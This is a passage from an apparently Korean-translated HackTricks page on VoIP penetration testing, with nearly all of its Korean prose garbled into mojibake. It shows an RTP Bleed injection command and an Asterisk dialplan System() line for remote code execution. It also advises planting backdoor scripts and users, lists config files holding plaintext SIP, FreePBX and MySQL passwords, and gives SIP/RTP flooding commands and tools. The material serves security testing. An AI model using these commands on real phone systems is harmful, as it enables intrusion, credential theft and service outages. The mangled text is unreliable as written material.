* **`rtpbleedinject.py`**ì€ [**sippts**](https://github.com/Pepelux/sippts)ì—ì„œ ê°€ì ¸ì˜¨ ê²ƒì…ë‹ˆë‹¤. RTP Bleed ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ RTP ìŠ¤íŠ¸ë¦¼(ì˜¤ë””ì˜¤ íŒŒì¼ì—ì„œ)ì„ ì „ì†¡í•˜ëŠ” ìµìŠ¤í”Œë¡œì‡ì…ë‹ˆë‹¤.
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Asteriskì—ì„œ ì·¨ì•½í•œ ì›¹ ë§¤ë‹ˆì € ì„œë²„ë¥¼ ì¹¨í•´í•˜ì—¬ **í™•ì¥ ê·œì¹™ì„ ì¶”ê°€í•˜ê³  ë‹¤ì‹œ ë¡œë“œ**í•  ìˆ˜ ìˆë‹¤ë©´, **`System`** ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
**`Shell`**ì´ë¼ëŠ” ëª…ë ¹ì–´ëŠ” í•„ìš”í•œ ê²½ìš° ì‹œìŠ¤í…œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
ì„œë²„ê°€ **`System`** ëª…ë ¹ì–´ì—ì„œ íŠ¹ì • ë¬¸ì ì‚¬ìš©ì„ ê¸ˆì§€í•˜ëŠ” ê²½ìš° (ì˜ˆ: Elastix), ì›¹ ì„œë²„ê°€ ì‹œìŠ¤í…œ ë‚´ì—ì„œ íŒŒì¼ì„ **ì–´ë–¤ ë°©ì‹ìœ¼ë¡œë“  ìƒì„±í•  ìˆ˜ ìˆëŠ”ì§€** í™•ì¸í•˜ê³ , ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ **ë°±ë„ì–´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ìƒì„±**í•œ ë‹¤ìŒ **`System`**ì„ ì‚¬ìš©í•˜ì—¬ í•´ë‹¹ **ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

#### í¥ë¯¸ë¡œìš´ ë¡œì»¬ íŒŒì¼ ë° ê¶Œí•œ

* **`sip.conf`** -> SIP ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.
* **Asterisk ì„œë²„ê°€ rootë¡œ ì‹¤í–‰**ë˜ëŠ” ê²½ìš°, rootë¥¼ ì¹¨í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **mysql root ì‚¬ìš©ì**ëŠ” ë¹„ë°€ë²ˆí˜¸ê°€ ì—†ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
* ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°±ë„ì–´ë¡œ ìƒˆë¡œìš´ mysql ì‚¬ìš©ìë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`FreePBX`**
* **`amportal.conf`** -> ì›¹ íŒ¨ë„ ê´€ë¦¬ì (FreePBX)ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.
* **`FreePBX.conf`** -> ë°ì´í„°ë² ì´ìŠ¤ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” FreePBXuser ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.
* ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°±ë„ì–´ë¡œ ìƒˆë¡œìš´ mysql ì‚¬ìš©ìë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`Elastix`**
* **`Elastix.conf`** -> mysql root íŒ¨ìŠ¤ì›Œë“œ, IMAPd íŒ¨ìŠ¤ì›Œë“œ, ì›¹ ê´€ë¦¬ì íŒ¨ìŠ¤ì›Œë“œì™€ ê°™ì€ ì—¬ëŸ¬ ì•”í˜¸ë¥¼ í‰ë¬¸ìœ¼ë¡œ í¬í•¨í•©ë‹ˆë‹¤.
* **ì—¬ëŸ¬ í´ë”**ëŠ” ì¹¨í•´ëœ asterisk ì‚¬ìš©ìì—ê²Œ ì†í•  ê²ƒì…ë‹ˆë‹¤ (rootë¡œ ì‹¤í–‰ë˜ì§€ ì•ŠëŠ” ê²½ìš°). ì´ ì‚¬ìš©ìëŠ” ì´ì „ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìœ¼ë©° êµ¬ì„±ë„ ì œì–´í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ Asteriskê°€ ì‹¤í–‰ë  ë•Œ ë‹¤ë¥¸ ë°±ë„ì–´ ë°”ì´ë„ˆë¦¬ë¥¼ ë¡œë“œí•˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### RTP ì£¼ì…

**`rtpinsertsound`** (`sudo apt install rtpinsertsound`) ë° **`rtpmixsound`** (`sudo apt install rtpmixsound`)ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ëŒ€í™”ì— **`.wav`** íŒŒì¼ì„ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜ëŠ” [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/)ì˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ëŒ€í™”ë¥¼ **ìŠ¤ìº”**í•˜ëŠ” (**`rtpscan.pl`**), ëŒ€í™”ì— `.wav`ë¥¼ ë³´ë‚´ëŠ” (**`rtpsend.pl`**) ë° ëŒ€í™”ì— **ë…¸ì´ì¦ˆë¥¼ ì‚½ì…**í•˜ëŠ” (**`rtpflood.pl`**) ë“±ì˜ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### DoS

VoIP ì„œë²„ì—ì„œ DoSë¥¼ ì‹œë„í•˜ëŠ” ì—¬ëŸ¬ ê°€ì§€ ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤.

* [**sippts**](https://github.com/Pepelux/sippts)ì˜ **`sipflood.py`**: **_**SipFlood**_ëŠ” ëŒ€ìƒì—ê²Œ ë¬´ì œí•œ ë©”ì‹œì§€ë¥¼ ë³´ëƒ…ë‹ˆë‹¤.
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Asteriskì—ì„œ ì‚¬ìš©ë˜ëŠ” IAX í”„ë¡œí† ì½œì— ëŒ€í•œ DoS ê³µê²©
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): SIP/SDP INVITE ë©”ì‹œì§€ë¥¼ UDP/IPë¡œ í”ŒëŸ¬ë”©í•˜ëŠ” ë„êµ¬
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): ì—¬ëŸ¬ ê°œì˜ ì˜¬ë°”ë¥´ê²Œ êµ¬ì„±ëœ RTP íŒ¨í‚·ì„ ë³´ëƒ…ë‹ˆë‹¤. ì‚¬ìš© ì¤‘ì¸ RTP í¬íŠ¸ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤ (ë¨¼ì € ìŠ¤ë‹ˆí•‘).
* [**SIPp**](https://github.com/SIPp/sipp): SIP íŠ¸ë˜í”½ì„ ë¶„ì„í•˜ê³  ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ DoSì—ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP ìŠ¤ìœ„ìŠ¤ ì•„ë¯¸ ë‚˜ì´í”„. SIP ê³µê²©ì—ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).
* [**sippts**](https://github.com/Pepelux/sippts)ì˜ **`sipsend.py`**: SIPSendë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ì ì •ì˜ SIP ë©”ì‹œì§€ë¥¼ ë³´ë‚´ê³  ì‘ë‹µì„ ë¶„ì„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [**sippts**](https://github.com/Pepelux/sippts)ì˜ **`wssend.py`**: WsSendë¥¼ ì‚¬ìš©í•˜ì—¬ ì›¹ì†Œì¼“ì„ í†µí•´ ì‚¬ìš©ì ì •ì˜ SIP ë©”ì‹œì§€ë¥¼ ë³´ë‚´ê³  ì‘ë‹µì„ ë¶„ì„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### OS ì·¨ì•½ì 

Asteriskì™€ ê°™ì€ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ì„¤ì¹˜í•˜ëŠ” ê°€ì¥ ì‰¬ìš´ ë°©ë²•ì€ ì´ë¯¸ ì„¤ì¹˜ëœ **OS ë°°í¬íŒ** (ì˜ˆ: FreePBX, Elastix, Trixbox)ì„ ë‹¤ìš´ë¡œë“œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ ë°°í¬íŒì€ í•œ ë²ˆ ì‘ë™í•˜ë©´ ì‹œìŠ¤í…œ ê´€ë¦¬ìê°€ ì—…ë°ì´íŠ¸ë¥¼ í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìœ¼ë©° ì‹œê°„ì´ ì§€ë‚¨ì— ë”°ë¼ **ì·¨ì•½ì **ì´ ë°œê²¬ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì°¸ê³  ìë£Œ

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* íšŒì‚¬ë¥¼ **HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PDFë¡œ HackTricks ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìƒí’ˆ**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
